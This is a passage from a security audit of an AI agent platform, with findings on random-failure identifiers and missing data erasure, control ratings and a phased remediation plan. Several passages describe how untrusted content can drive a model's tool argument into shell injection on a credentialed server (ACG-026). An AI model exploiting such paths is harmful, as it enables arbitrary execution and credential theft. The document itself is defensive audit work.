- **Cross-reference.** ACG-006 records a zero-valued sentinel written into an audit *hash* field
  on key failure. This finding is the same anti-pattern in a different subsystem: a zero-valued
  sentinel written into an *identifier* on entropy failure. They should be remediated under one
  rule — **no security-relevant field may be filled with a constant on failure** — and tested
  together.

- **Evidence.** The CSPRNG is `fopen("/dev/urandom")` + `fread`
  (`src/posix/platform_random.c:5`):

  ```c
  int platform_random_bytes(void *buf, size_t len)
  {
     FILE *f = fopen("/dev/urandom", "r");
     if (!f) return -1;
     size_t n = fread(buf, 1, len, f);
     fclose(f);
     return (n == len) ? 0 : -1;
  }
  ```

  Failure is not exotic. `fopen` fails under file-descriptor exhaustion (`EMFILE`/`ENFILE`) — a
  state a busy server reaches — and in any container built with a minimal `/dev`, which is
  precisely the direction the delegate sandbox posture pushes. `getrandom(2)` would avoid both.

  Failure handling splits three ways across the 13 call sites:

  | Behaviour on CSPRNG failure | Sites |
  | --- | --- |
  | `return -1` (correct) | `oauth_pkce.c:87`, `kb_oidc_login.c:107`, `kb/enroll.c:33`, `git_oauth_github.c:135`, `workspace.c:406`, `cli_mcp_serve.c:314` |
  | `memset(raw, 0, …)` — emit a **constant** id | `session_id.c:45`, `server_auth.c:303`, `ingress_preinject.c:56`, `db2/c/artifacts.c:29` |
  | Seed an LCG from `time()`/`pid` — emit a **predictable** id | `cli_launch.c:84`, `cmd_agent_delegate.c:75`, `server_trigger.c:37` |

- **Impact.** The zeroing branch is worse than random: it does not merely weaken the identifier, it
  makes **every** identifier generated under the failure identical
  (`00000000-0000-0000-0000-000000000000`). Session ids key session state, branch ownership and
  audit attribution; artifact ids key stored artifacts. A total collapse of the id space means
  concurrent sessions silently share state and the audit trail attributes their actions to one
  another — a direct hit on the `docs/SECURITY.md` claim that "audit records keep the originating
  principal when work crosses a delegate, workflow, KB, or tool boundary."

- **Required change / owner.** Runtime & Audit:
  1. Reimplement `platform_random_bytes` on `getrandom(2)`, retaining `/dev/urandom` only as a
     fallback for kernels lacking it, removing the descriptor dependency.
  2. Make identifier generation fail closed as token generation already does. A session that
     cannot obtain a unique id must not proceed under a shared one.
  3. Delete the LCG fallbacks. A predictable identifier is not a graceful degradation.

- **Acceptance tests.**
  - With `platform_random_bytes` forced to fail, session, artifact, trigger and ingress id
    generation each return an error; none returns a constant or a `time()`-derived value.
  - `platform_random_bytes` succeeds with all file descriptors exhausted.
  - The shared rule with ACG-006 is asserted: no security-relevant field is populated with a
    constant on failure.

<a id="acg-031"></a>
### ACG-031 — no data-subject erasure, and no content retention control

- **Control objective:** mutable personal data has a bounded lifetime, a documented classification,
  and can be deleted on request; the immutable WORM ledger records that deletion without retaining
  the deleted content.

- **Evidence.** `docs/SECURITY.md` instructs operators: "Memory and document ingestion can retain
  sensitive source text. Scope the KB, **configure retention**, and avoid sending restricted
  evidence to an external synthesis provider."

  There is no retention control to configure. A search of `docs/gen/configuration.md` for
  retention/TTL keys returns `learning_proposal_ttl_days`,
  `memory_typed_facts_speculative_ttl_days`, `kb.purge_fence_ttl_s`, `AIMEE_KB_CACHE_TTL_S` and
  `AIMEE_WORKFLOW_LEASE_TTL_SECS` — TTLs on speculative facts, proposals, a purge fence, a cache
  and a lease. None of them bounds how long ingested document text, memory content, conversation
  history or audit rows are kept. The only `--retention-days` flag in the CLI is on `aimee index`
  (`src/cmd_index.c:204`) and governs code-index lifecycle, not content.

  Separately, there is **no per-principal erasure operation**. Purge is scoped to a project
  (`aimee index purge`, `db2_kb_service_clear_current_project`), not to a data subject. Mutable DB2
  data includes memories, documents, conversation history and derived records keyed by principal;
  a request to erase one person's mutable data cannot be executed with the tools that exist.

- **Impact.** For a product whose premise is durable cross-session memory of a user's work, this is
  the gap most likely to be raised first in any privacy review, and it blocks the primary audit's
  own completion gate: *"Every durable data category has documented classification, scope,
  retention, deletion, backup, restore, and audit behavior."*

- **Design notes that belong in the decision, not the backlog.**
  - **WORM is never an erasure target.** Its purpose is to retain immutable evidence. A subject
    erasure deletes mutable source data and derived content; it appends a new WORM event stating
    that deletion was requested and completed. No existing WORM row is updated, deleted, encrypted
    for later shredding, or made unreadable. The deletion event must contain only the minimum
    non-content evidence needed for accountability — operation/request id, authorized actor,
    bounded scope or pseudonymous reference, affected-store counts, policy revision, timestamp,
    outcome and a non-reversible evidence digest — never a copy of the deleted content.
  - **Turning WORM on does not depend on an erasure design.** ACG-002 should make the chain
    default-on independently. The privacy control is minimization at audit-event creation plus
    access control over the immutable ledger, not retrospective deletion from it.
  - **At-rest encryption is undocumented outside the vault.** `docs/STORAGE_TIERS.md` and
    `docs/DEPLOYMENT.md` contain no encryption guidance. The vault has real custody options
    (TPM 2, PKCS#11, KMS); DB1, DB2 and the audit log have none stated, so an operator cannot tell
    whether at-rest protection is expected from them or from the platform. This compounds ACG-008.

- **Required change / owner.** Data & Privacy:
  1. Add content retention policy: per-class maximum age for mutable document text, memory content,
     conversation history and derived data, with a scheduled reaper and an audited deletion event.
     WORM evidence is governed by a separate immutable evidence-retention and access policy and is
     never subject to row deletion.
     Until it exists, remove "configure retention" from `docs/SECURITY.md` — the document must not
     instruct an operator to use a control that is absent.
  2. Add `aimee kb erase-subject <principal>` spanning memories, documents, history and derived
     vectors, appending a minimized WORM completion event without the deleted content.
  3. Define and test the immutable deletion-event schema, including prohibited payload fields and
     the rule that erasure code has no UPDATE/DELETE capability over the WORM store. This work is
     independent of, and does not block, ACG-002's default-on remediation.
  4. State the at-rest expectation for DB1, DB2 and the audit log in `docs/STORAGE_TIERS.md`, even
     if the answer is "provide it at the volume layer."

- **Acceptance tests.**
  - `aimee kb erase-subject` removes a principal's mutable rows and derived content across every
    applicable store, then appends exactly one verifiable deletion-completion event containing no
    deleted content.
  - After the mutable-data retention age elapses, a reaper deletes the corresponding content and
    appends the same bounded deletion evidence.
  - Before/after verification proves all prior WORM rows are byte-identical, the chain gained only
    the deletion event, and any attempted WORM UPDATE/DELETE is refused.
- **Remediation verification (2026-08-27):** owner-gated begin/complete routes and CLI support now
  drive a durable two-phase request across DB1 and DB2 with an idempotent retry journal. Mutable
  memories, documents, conversations, vectors and registered derived data are deleted; the scheduled
  reaper applies the same bounded policy. `scripts/subject-erasure-pg-test.sql` passed in a disposable
  remote PostgreSQL database with separate roles, proving retry idempotency, retention, cross-store
  counts, exactly one minimized completion intent and byte-identical prior outbox rows. The isolated
  WORM worker gate separately proves exactly-once delivery into an unbroken SQLite hash chain.

## Cross-cutting observation

Five findings — ACG-002, ACG-006, ACG-026, ACG-029 and ACG-030, drawn from both passes — share one
shape, and naming it predicts where the next finding will be: **a correct control with a permissive
failure mode, applied inconsistently across call sites.**

`shell_escape` is right at 90 of 110 sites. The CSPRNG is right on every token path and wrong on
every identifier path. The generated config accessor was fixed by hand at the one call site someone
audited, and left unfixed at ~380 others. The audit hash writes a sentinel that looks like a hash.
The WORM gate defaults to the permissive state. In every case the exception is invisible at the call
site — the defective code *looks* like the correct code, which is why review did not catch it and
why the same review will not catch the next one.

That is an argument for mechanical enforcement over reviewer attention, which is why the
remediations above propose `*-check` targets rather than guidelines. The repository's ~90 existing
checks show this is already the house style; these are the places the style was not applied.

## Control assessment

Ratings describe the source baseline, including its shipped defaults. `Deficient` means a verified
gap prevents the stated objective; it does not mean no useful control exists.

| Domain | Rating | Effective controls and evidence | Material gaps |
| --- | --- | --- | --- |
| Security architecture and trust boundaries | Partial | Split client/server/KB processes, generated route inventory, binary link-boundary checks, documented hostile inputs | KB auth-off owner mode; optional direct module egress; managed topology grants Docker host control |
| Identity, authentication, and authorization | Deficient | Central server route-to-capability mapping, bearer enrollment, signed-write tiers, TLS/mTLS and certificate-pinning support; bearer comparison is constant-time and deliberately non-short-circuiting | ACG-001, ACG-011, ACG-012, ACG-013, ACG-017, ACG-028 |
| Tool, delegate, workspace, and egress containment | Deficient | Delegate containers are networkless and resource-bounded and the degraded host fallback has been removed entirely; server tool policy exists | ACG-026 (model-controlled shell injection reaching the credentialed server), ACG-028; unsigned instruction artifacts, incomplete ingress integrity, direct egress, skill root escape |
| Credential custody and cryptography | Deficient | Vault ingestion scrubs bootstrap environment, hardened custody providers exist, secret fingerprints replace raw values in several logs, TLS 1.2 minimum is enforced where TLS is enabled | Auth-free KB path, weak DB1 secret, optional plaintext service links, audit hash coverage/key failure, ACG-030 (identifier CSPRNG fails open to a constant), no complete cryptographic agility or key-lifecycle evidence |
| Data protection, privacy, retention, and deletion | Deficient | Tenant-aware tables, export/delete functions, configurable redaction, encrypted secret custody | ACG-031 (no content retention control and no data-subject erasure); read isolation is not default-on; global audit views; no authoritative data/purpose/retention/deletion/hold matrix or deletion verification |
| Audit completeness and tamper evidence | Deficient | Append-only triggers, hash chain, checkpoints, seals, witness support, verification APIs, default operational audit log | ACG-002, ACG-003, ACG-006, ACG-015, ACG-021; no proof that surviving records are complete |
| Governance, policy, approvals, and accountability | Deficient | Ownership prose, proposal lifecycle, module boundaries, generated API conformance, release environment hooks | ACG-029 (policy reads cannot distinguish "off" from "authority unreachable"); no mechanical separation of duties, incomplete control ownership/evidence, coarse agent identity, no governed exception register |
| Secure development and supply chain | Deficient | Large native test suite, ~90 bespoke structural `*-check` targets, module boundary lint, locked Go/npm dependency graphs, digest assembly of multi-arch images | ACG-027 (no sanitizer/SAST/secret gate; hardening left to toolchain defaults), reachable Go vulnerability, mutable CI actions, unattested releases, unverified build downloads, broken fuzz gate |
| Deployment and infrastructure hardening | Deficient | Rootless/delegated isolation options, split deployment, core-dump suppression, bootstrap secret scrubbing, health probes | Critical default KB exposure, superuser DB1, plaintext internal links, auth/rate limits vary by plane |
| Injection and data-access surface | Pass | DB2 access is parameterised throughout via the named-placeholder rewriter onto `PQexecParams`; the two `IN (%s)` constructions interpolate placeholders and a static subquery, never values. No SQL injection was found | Command construction is the exception, not SQL: see ACG-026 |
| Detection, incident response, backup, and recovery | Deficient | Health endpoints, audit verification, shutdown forensics, backup/restore tooling and operator guidance | No source evidence of response plan/exercises, alert ownership, RPO/RTO, recurring restore proof, or assured off-host evidence |

### Trust-boundary and listener inventory

The native server exposes 386 generated `/v1` routes (258 POST, 114 GET, 10 DELETE, and 4 PUT;
348 exact and 38 prefix routes). Central dispatch maps operations to capabilities, but capability
assignment is not equivalent to actor/tenant object authorization. The following inventory is the
minimum architecture record that must become machine-maintained.

| Boundary | Principal and transport | Sensitive operations/data | Audit and control result |
| --- | --- | --- | --- |
| Native client to server | Bearer over HTTP or optional TLS/mTLS; signed-write tiers for selected mutations | Sessions, tools, workspaces, models, providers, workflows, dashboards | Central route auth is useful; read-only bearer is overbroad and object authorization is incomplete |
| Server to KB | Shared optional bearer over HTTP in shipped Compose | DB2 memories, documents, governance, tenants, vault, enrollment | Critical: absent bearer becomes owner; no workload identity or encrypted default link |
| Browser to control-web | Secure/HttpOnly/SameSite cookies, CSRF checks, CSP, OIDC/local auth, session timeout | Identity, organization, governance, audit console | Strong browser controls; upstream KB trust and JWKS egress remain weak points |
| Browser to runtime-web | Session cookie and server-side session state | Chats, attachments, prompts, tool results | Session controls exist; ingress-integrity and lifecycle evidence are incomplete |
| Gateway to external messaging | Platform tokens plus local pairing state | Messages, speech, delivery targets, user identity | Local approval compensates partly; pairing identity/state is not transaction-safe |
| Delegate/tool runtime | Server-issued work plus optional networkless containers and policy gates | Repository files, commands, credentials, external effects | Useful containment; instruction provenance, exact agent identity, and complete decision capture are absent |
| DB1 PostgreSQL/SQLite | Application DSN / process-local database | Runtime, sessions, workflows, tokens, local audit | Static superuser TCP topology and lifecycle evidence are inadequate |
| DB2 PostgreSQL | KB-owned connection, optional RLS and tenant context | Shared knowledge, memory, documents, vault, organization, WORM | Ownership split is clear; default isolation and complete evidence are not |
| External providers, MCP, git and telemetry | Per-module HTTPS/stdio/SSE clients and credentials | Prompts, code, documents, outputs, repository metadata | No single enforceable egress owner; peer/resource and processor controls vary |
| Filesystem and container host | OS user, workspace paths, volumes; Docker socket in managed mode | Source, configs, TLS material, vault state, artifacts, audit files, containers | OS boundary is important but skill reads escape logical workspace; Docker socket equals host control |

### Data protection and lifecycle assessment

The schema lint distinguishes 241 DB2/shared tables and 102 DB1-only tables. Table count is not a
data inventory: the proposal requires an owner-reviewed map at field and data-flow level.

| Data family | Expected classification and scope | Present safeguards | Missing assurance evidence |
| --- | --- | --- | --- |
| Prompts, chats, attachments and tool results | Confidential; user, session, project and tenant scoped | Session controls, selected redaction, DB ownership boundaries | Purpose/consent basis, exact read predicates, retention, deletion propagation, backup expiry, processor disclosure |
| Memories, documents, embeddings and code index | Confidential; actor/project/workspace/tenant scoped | Tenant columns and optional RLS, signed writes, export/delete primitives | Default-deny reads across every family, legacy-row quarantine, vector/cache erasure and negative isolation proof |
| Credentials, API keys, pairing and enrollment material | Restricted; principal/purpose scoped | Vault custody, bootstrap scrubbing, file permissions, fingerprints | Complete rotation/revocation SLA, DB1 secret generation, pairing atomicity, key inventory and cryptoperiod evidence |
| Audit, policy, trace, token and governance evidence | Confidential/integrity-critical; actor/tenant plus auditor scope | JSONL, WORM chain, checkpoints, seals, witness support | Complete capture, full-field binding, audit-read authorization, retention/legal hold, off-host custody and access review |
| Repository/workspace and generated artifacts | Confidential/integrity-critical; workspace and approved artifact scope | Mirrored workspace isolation, merge rails, module ownership, git history | Canonical root on all reads, load-time artifact digest/signature, provenance and post-checkout mutation detection |
| Operational logs, metrics, crash and shutdown evidence | Internal/confidential; operator scoped | Structured logs, secret-fingerprint conventions, core-dump suppression | Central classification/redaction tests, retention, access review, alert ownership and evidence preservation procedure |
| Provider/MCP/git/telemetry transfers | Same classification as source payload; destination and purpose scoped | TLS and per-client validation in several paths | Processor/subprocessor inventory, destination allowlist, minimization, regional/contract controls, deletion and incident notice |
| Backups, exports and restore media | Inherit highest contained classification | Backup/export tooling and restore guidance | Encryption/key separation, inventory, immutable/off-site policy, RPO/RTO, deletion/hold reconciliation and recurring restore proof |

### Positive controls retained by the proposal

Remediation must preserve controls that were confirmed in source or by execution:

- the server's generated route catalogue and centralized capability dispatch cover all 386 declared
  routes; lint checks documentation and conformance rather than relying on an informal endpoint list;
- remote-server code supports TLS 1.2+, certificate pinning/mTLS, signed-write tiers and replay
  rejection; these need to become consistent shipped defaults across the KB and internal links;
- disposable bootstrap processes ingest secrets into the Vault, scrub inherited credentials before
  long-lived children, reject spoofed bootstrap markers, and disable credential-bearing core dumps;
- browser services implement hardened cookie flags, CSRF defenses, CSP, session expiry and login
  throttling, with credential material held in server-side/memory custody;
- delegate isolation supports no-network containers and resource bounds and refuses an unsafe
  degraded fallback when the requested sandbox cannot be created;
- WORM storage provides append triggers, full-sync durability options, chain verification,
  checkpoints, seals and external witness hooks when correctly enabled, although the coverage and
  canonical-record findings prevent a completeness claim;
- DB2 access is parameterised throughout through the named-placeholder rewriter onto
  `PQexecParams`; the second pass found no SQL injection anywhere in the tracked tree;
- bearer comparison is constant-time (`server_ct_equal` → `aimee_core_credential_equal`) and the
  match loop deliberately declines to short-circuit on a primary hit, so primary, enrolled and
  invalid credentials cost the same;
- security-critical randomness fails closed: PKCE verifiers, OIDC login secrets, enrolment tokens
  and OAuth CSRF state all return an error on CSPRNG failure (ACG-030 records where that discipline
  stops, on the identifier paths);
- the container entrypoint drops privilege, exec'ing the server as `aimee` via `runuser` rather than
  running as root;
- log hygiene holds: every `LOG_*` call site mentioning token, secret, credential or password
  reports names, fingerprints and return codes, never secret values;
- `make lint` passed all 70 checks, and `make build-integrity` passed source existence, target,
  binary linkage, module ownership, credential-bootstrap and product-boundary checks;
- `make unit-tests` passed the locally executable native suite and all three Go module test suites
  passed; the skipped live PostgreSQL tenant gate and broken fuzz workflow remain explicit gaps.

## Assurance-framework readiness

These are engineering-readiness mappings, not certifications or legal conclusions.

| Lens | Readiness | Source-based conclusion and required external evidence |
| --- | --- | --- |
| NIST CSF 2.0 — Govern | Deficient | Technical ownership and proposals exist; control/risk/exception/supplier registers, accountable approvers, policy review and evidence cadence do not |
| NIST CSF 2.0 — Identify | Partial | Major processes, routes and stores are identifiable; authoritative asset, data-flow, data-classification, dependency and processor inventories are absent |
| NIST CSF 2.0 — Protect | Deficient | Several strong cryptographic, vault, session and sandbox controls are defeated by KB, tenant, artifact, dashboard and DB defaults |
| NIST CSF 2.0 — Detect | Partial | Health, logs, WORM verification and shutdown forensics exist; incomplete capture and no alert/triage ownership prevent reliable detection assurance |
| NIST CSF 2.0 — Respond | Deficient | No checked-in vulnerability intake, incident roles/playbooks, evidence-preservation procedure, exercise or notification decision record was found |
| NIST CSF 2.0 — Recover | Deficient | Backup/restore mechanisms exist, but no approved RPO/RTO, immutable/off-site policy or recurring restore evidence was found |
| NIST SSDF 1.1 | Deficient | Native quality gates and module boundaries are meaningful; build inputs, actions, provenance, vulnerability gates, fuzz evidence and response workflow do not meet a releasable assurance bar |
| OWASP ASVS / service controls | Deficient | Browser/session and server transport controls are substantial; broken object authorization, SSRF, file-root escape and inconsistent rate/resource limits are blocking gaps |
| OWASP LLM/agentic control intent | Deficient | Tool guardrails and sandboxing exist; untrusted-content transitions, instruction artifact identity, agent identity, egress and action-evidence completeness are not closed |
| SOC 2 / ISO 27001 control intent | Not attestation-ready | Source can support portions of logical access, change and logging narratives; operating evidence, organizational controls, vendor management, access reviews, incident exercises and recovery tests are external prerequisites |
| Privacy lifecycle readiness | Deficient | Export/delete and scoping primitives exist, but no approved purpose/data-flow/retention/deletion/hold/processor record proves end-to-end treatment |

## Proposed program

### Immediate disposition

Do not promote the audited commit as an exposed or production-ready deployment while ACG-001 or
ACG-026 is open. These are independent Critical release blockers reached from opposite directions:
ACG-001 is an unauthenticated owner surface reached over the network, ACG-026 is arbitrary execution
on the credentialed server reached through a model-supplied tool argument. Closing one does not
mitigate the other. Do not represent it as safely multi-user or multi-tenant while ACG-011 through ACG-013 are
open. Do not represent its governed-action ledger as complete tamper-evident evidence while
ACG-002, ACG-003, ACG-006, ACG-015, or ACG-021 is open. No product source audit can itself support
a claim of SOC 2, ISO 27001, privacy-law, or other legal compliance.

For an already-running instance, containment precedes redesign: unpublish and network-isolate the
KB listener; set and rotate its bearer; prohibit anonymous owner/enrollment paths; restrict
dashboard and `skill.show` access; disable `scope=all` for ordinary identities; disable autonomous
triggers and live forge for shared/untrusted repositories; disable or restrict the git MCP toolset
until ACG-026's sink is closed, since any model turn can reach it; and upgrade `golang.org/x/text`. Any
instance that was reachable with an empty KB bearer must be treated as potentially owner-enrolled:
review enrollment/audit state and rotate dependent credentials. Any instance whose git MCP tools
were reachable by a model processing untrusted content must additionally be treated as potentially
executed-upon: review shell and git history, and rotate the forge credentials that
`git_cred_inject_build_env_for_repo` places in that process's environment.

### Phase 0 — containment and release freeze (0–72 hours)

| Work | Accountable owner | Evidence required to exit |
| --- | --- | --- |
| Block all auth-off KB topologies, remove default port publication, mint a least-privilege server credential, and isolate internal networks | Platform Security | Anonymous/sibling/host negative tests for every image/Compose profile; credential rotation record |
| Remove ordinary access to global dashboards, caller-selected skill roots and `scope=all` | Identity & Data Authorization | Route-policy diff plus two-user/two-project negative tests |
| Disable autonomous triggers/live forge in shared deployments until all content ingresses are gated | Agent Security | Configuration migration, startup posture report and hostile-ingress smoke tests |
| Close the ACG-026 sink: run the git MCP path through `safe_exec_capture_cwd_env_timeout()`'s `argv` vector and validate `path`/`cwd` against the assigned workspace root | Platform Security & Tooling | Injection canary test refuses; no shell interpreter on the git tool path |
| Upgrade x/text to v0.39.0 or later and require govulncheck | Dependency Maintenance | Clean call-graph scan and invalid-UTF-8 regression |
| Repair the nightly fuzz build and remove crash-masking `|| true` | Security Testing | Green presubmit build and one retained nightly corpus/crash-artifact run |

### Phase 1 — release-blocking control closure (0–30 days)

1. **Workload identity and exact authorization.** Give server, KB, browser services, delegates and
   agents distinct identities. Derive an immutable actor/team/project/workspace decision at the
   authenticated boundary, require it in every content read, and enable fail-closed RLS after a
   measured legacy attribution/quarantine migration.
2. **Filesystem-safe artifact access.** Replace string/path checks with authorized workspace handles
   and no-follow, beneath-root descriptor walks on every skill, support-file, workspace and artifact
   read. Run traversal, symlink, race and cross-workspace tests remotely.
3. **Durable, canonical governed-action evidence.** Enable WORM by default, put decisions/effects
   behind a transactional or synchronous capture seam, add explicit loss health, and introduce a
   versioned canonical hash binding time and all attribution fields. Label old rows `v1-partial`.
4. **Reproducible and attestable release.** Pin external actions and all executable inputs by digest,
   separate build from publish authority, enable signed provenance, emit SBOMs, sign images/binaries,
   publish checksums, and verify before promotion.
5. **Harden the shipped data plane.** Generate DB1 secrets, separate migrator/runtime roles, require
   verified TLS on TCP links, test backup/restore, and make product capability/build parity explicit.
6. **Remove the quoting trap, not just the sink.** Rename `shell_escape` to `shell_quote`, make it
   emit a fully quoted token so the compiler forces every one of the ~110 call sites to be
   revisited, and add a `shell-quote-check` target to required CI (ACG-026 changes 2-4). Closing the
   sink in Phase 0 removes the live exposure; this removes the mechanism that produced it.
7. **Make memory-safety defects visible.** Add a required CI job running the unit-test shards under
   `-fsanitize=address,undefined`, build the fuzz targets with sanitizers, wire the existing
   `static-analysis`/`cppcheck`/`clang-tidy` targets into `lint`, and add secret scanning
   (ACG-027). This is sequenced *before* the memory-safety remediation work it exists to validate:
   without a detector, fixes in ~872k lines of C cannot be shown to have worked.
8. **Give policy reads a failure channel.** Change the config-accessor generator so a read failure is
   distinguishable from an explicit `false`, and make security-relevant flags declare their safe
   default (ACG-029). Pair with the ACG-006/ACG-030 rule below.
9. **One rule for failure sentinels.** No security-relevant field may be populated with a constant on
   failure. Apply it jointly to the audit argument-hash (ACG-006) and to identifier generation
   (ACG-030), and move `platform_random_bytes` onto `getrandom(2)` so the failure being handled
   becomes rare as well as safe.
10. **Separate mutable-data erasure from immutable evidence.** Deliver ACG-031 without weakening
    item 3: erasure removes mutable source and derived data, while WORM appends only a minimized
    deletion event. The erasure path must never receive UPDATE/DELETE authority over WORM and must
    never copy the deleted content into its evidence event.

Phase 1 depends on defining identity and canonical evidence schemas before broad migration. ACG-002
and ACG-031 can proceed independently under the immutable-evidence rule above. Roll out
tenant enforcement in observe, backfill/quarantine, enforce, and remove-legacy stages; never use a
silent fail-open compatibility path. Dual-write WORM v1/v2 during a bounded migration, but verify and
export the versions separately.

### Phase 2 — systemic agent and platform assurance (30–90 days)

- sign or approve exact digests for plugins, skills, workflows and agent templates; bind every run
  and audit verdict to the loaded dependency closure, with revocation and downgrade protection;
- apply one deterministic integrity decision to watched files, uploads, retrieval, recall, memory,
  attachments and forge inputs before they can become instructions or trigger effects;
- issue per-agent/per-run principals and server-derived on-behalf-of chains, and replace spoofable
  hook environment identity with a scoped authenticated token;
- deliver the single egress authorization/audit service, then remove direct network privileges from
  migrated module processes; include SSRF/DNS-rebinding defense and destination/byte/time budgets;
- bound MCP lines, events, responses, idle time, total time and restart behavior; make gateway
  pairing CSPRNG-backed, identity-confirmed, unique and transactionally durable;
- resolve path authorization once rather than per call site: ACG-013 and ACG-028 are a reachable
  exploit and a shared helper of the same defect, and must be fixed under one invariant — resolve
  beneath an authorized root with no symlink following, via directory FDs and
  `openat2(RESOLVE_BENEATH|RESOLVE_NO_SYMLINKS)` or a portable no-follow walk — with the helper's
  ignored bounds parameter honoured and its misleading name corrected;
- deliver the mutable-content retention policy and `aimee kb erase-subject` from Phase 1 item 10;
  append a minimized deletion event and prove that no prior WORM row changed (ACG-031);
- adopt a hardened release profile (`-D_FORTIFY_SOURCE=3`, `-fstack-protector-strong`, full RELRO,
  `-Wformat-security`) rather than inheriting whatever the build host defaults to, and remove
  `-Wno-format-truncation` so silent truncation of a constructed command or path is a build failure
  (ACG-027);
- make Make/CMake security behavior explicit and equivalent, or retire one as a production build.

### Phase 3 — auditable operating system (90–180 days)

- establish a versioned control register mapping objective, implementation, evidence query/artifact,
  owner, reviewer, cadence, retention, exception and framework references;
- publish a secure vulnerability intake/disclosure process and incident plan; exercise credential
  compromise, tenant disclosure, poisoned agent content, malicious dependency, audit loss and restore;
- approve the field-level data inventory, purposes, flows, processors, regions, retention, deletion,
  backup expiry and legal holds, and test data-subject/tenant export and erasure end to end;
- define service objectives and RPO/RTO, automate encrypted off-site backups and recurring isolated
  restores, and retain signed result evidence;
- map sensitive directories to accountable CODEOWNERS, require non-author security/data/release
  approval, export branch/environment rules, and review time-bounded risk exceptions;
- commission an independent authenticated service, tenant-isolation, agent-prompt/instruction,
  container-host and supply-chain penetration test after Phase 2, then track retest evidence.

### Release and exception gates

A production promotion must fail unless all of the following are machine-verifiable:

- zero open Critical findings; no open High finding without a signed, time-bounded exception from
  the accountable security owner and product risk owner;
- every shipped listener starts authenticated and least-privileged, and an anonymous/sibling-origin
  negative matrix passes for every deployment profile;
- tenant/object authorization and audit-view filters pass a two-actor/two-tenant negative suite
  against real PostgreSQL with pool reuse, pagination, cache and restart cases;
- governed-action attempts, decisions, effects, terminal results, drops and chain heads reconcile
  with no unexplained gap under crash/storage/queue fault injection;
- dependency vulnerability gates, all fuzz target builds/runs, secret/history scan, SAST, sanitizer
  test runs, release input verification, SBOM, signed provenance and consumer signature verification
  pass, and the shipped binary reports full RELRO, stack canaries and fortified libc calls;
- no escaped value reaches a shell as an unquoted interpolation (`shell-quote-check`), and no
  security-relevant configuration read resolves a transport failure to its permissive value
  (`config-failopen-check`);
- backup restore meets approved RPO/RTO and produces a signed evidence artifact; incident and access
  review evidence is current for its declared cadence.

An exception must identify finding/control, affected versions and deployments, exposure, rationale,
compensating controls, approvers, opening and expiry dates, monitoring, rollback trigger, and a
remediation milestone. Exceptions cannot waive ACG-001 for an exposed deployment, authorize silent
tenant-isolation failure, or describe incomplete WORM evidence as complete.

### Evidence bundle and continuous governance

Each release should generate one immutable, signed bundle containing source/ref and dirty-state,
compiler/toolchain and locked inputs, route/capability manifest, security-feature manifest, tests and
skips, coverage/fuzz corpus metadata, SAST/SCA/secret results, SBOM, provenance, artifact digests and
signatures, database migrations/policy state, deployment-default checks, WORM schema/version and
verification head, approvals/exceptions, and restore evidence. A control dashboard should distinguish
`implemented`, `enabled`, `tested`, `operating`, `exception`, and `unknown`; it must never infer
operation from source presence.

## Verification record

### Historical pre-remediation baseline

| Check on audited baseline | Result | Assurance implication |
| --- | --- | --- |
| Registered Aimee `index investigate`, then required `index hybrid` fallback | Unavailable: local index `/v1` service did not respond | Direct tracked-tree inspection used; no indexed repository-memory claims included |
| `make lint` | Pass: all 70 checks | Generated APIs, ownership/boundaries and numerous structural rules pass; report-only proposal drift is not enforcement |
| `make unit-tests` | Pass for locally runnable native tests | Native unit/sanitizer/event-bus checks pass; live P1 PostgreSQL RLS test skipped because `AIMEE_TEST_PG_URL` was unset |
| `make build-integrity` | Pass | Shipping builds link with intended database/product boundaries; credential bootstrap and target/source integrity checks pass |
| `go mod verify && go test ./...` in `control-web`, `runtime-web`, `server-go` | Pass in all modules | Go module contents and tests pass at this commit |
| Latest `govulncheck ./...` in all Go modules | control-web/runtime-web clean; server-go finds reachable GO-2026-5970 | ACG-005; scanner selected Go 1.26.7 because the current tool requires Go 1.25+ |
| `npm audit --package-lock-only` | Frontend: one High development advisory; frontend omit-dev: zero; VS Code extension: zero | ACG-010; no production npm advisory established by this check |
| `make fuzz` | Fail at build: missing `tests/fuzz_memory_search.c` | ACG-024; later fuzz execution is not evidence |
| `make integration-tests` | Exit 2: 70/71 passed, 1 failed, 64 service-dependent checks skipped | Without `AIMEE_STORE_URL`, DB1 health expected `ok` but was `unavailable`; KB/store/session/workflow checks lacked configured services, so this is not full-stack evidence |
| `readelf` hardening probe of a shipped binary | PIE, non-executable stack and *partial* RELRO present; **zero** `__stack_chk` and **zero** `_chk` symbols | ACG-027; PIE/NX/partial RELRO come from host toolchain defaults, not a build decision, and stack canaries and fortified libc are absent entirely |
| Second-pass sweep of shell-command construction (`shell_escape` call sites and their format strings) | ~20 of ~110 sites interpolate an escaped value as a bare `%s` | ACG-026; the reachable sink takes a model-supplied MCP tool argument |
| Second-pass sweep of `platform_random_bytes` failure handling across all 13 call sites | 6 fail closed, 4 emit a constant, 3 emit a `time()`-seeded value | ACG-030 |
| Second-pass sweep of generated config accessors | ~380 discard the read status; one call site fixed by hand to compensate | ACG-029 |
| Targeted credential-pattern scan of tracked content | No apparent live credential verified | This is not a historical/entropy or external secret-platform scan |
| Semgrep, Trivy, Grype, osv-scanner, Gitleaks, ShellCheck, Bandit, cppcheck, clang-tidy, pip-audit, Syft and cargo-audit | Tools unavailable in audit environment | Their absence is an evidence limitation, not a clean result |

### Remediation verification (2026-08-26 through 2026-08-27)

The remediation branch was exercised on a separate Linux host (`root@192.168.1.252`) using GCC 14
and real PostgreSQL 18/pgvector, in addition to local dependency and frontend checks. These results
supersede the corresponding baseline rows above; expected service-unconfigured skips remain stated
rather than being counted as coverage.

| Check on remediation branch | Result | Assurance implication |
| --- | --- | --- |
| `make lint` | Pass: all 74 checks | Includes new workflow-pin, build-input, shell-quote, fail-open config and security-claim consistency gates |
| `TEST_RUN_JOBS=1 make unit-tests` | Pass: all 657 binaries | Complete hermetic native suite, including exact 5,000-row bus durability verification |
| `TEST_RUN_JOBS=1 make sanitizers` | Pass: all 657 binaries with ASan/UBSan and leak detection | Full clean-build closure; remediation also fixed sanitizer-discovered lifetime, leak, stack and `SIGPIPE` defects |
| P1 RLS gate against PostgreSQL 18/pgvector | Pass with separate migrator, runtime and administrative roles | Exercises schemas, grants, RLS, memory governance, WORM, Vault/witness, JWKS and concurrency against a real store |
| `make integration-tests` | Pass: 115/115 runnable checks; 20 explicitly service-unconfigured skips | Includes thin-client remote exclusive mode and served argspec end-to-end paths |
| `make fuzz` and assurance fuzz targets | Pass, including 10,000 management inputs and the checked corpus matrix | Previously missing targets now build and execute; unit sanitizer run also covers 60,000 witness mutations and 5,454 AWS event-stream decodes |
